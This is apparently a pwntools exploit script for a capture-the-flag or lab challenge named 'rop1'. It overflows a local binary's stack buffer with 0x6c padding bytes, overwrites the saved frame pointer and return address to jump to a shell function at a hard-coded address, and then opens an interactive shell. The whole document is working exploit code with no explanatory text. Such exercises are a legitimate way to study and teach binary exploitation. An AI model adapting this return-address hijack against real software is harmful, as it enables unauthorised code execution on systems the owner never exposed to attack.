#!/usr/bin/env python2

from pwn import *
from struct import pack

shellloc = 0x08048505

tube = process('dock/rop1')

tube.send('a' * 0x6c)
tube.send('EBP_')
tube.send(pack('<L', shellloc))
tube.sendline('')

term.init()

tube.interactive()

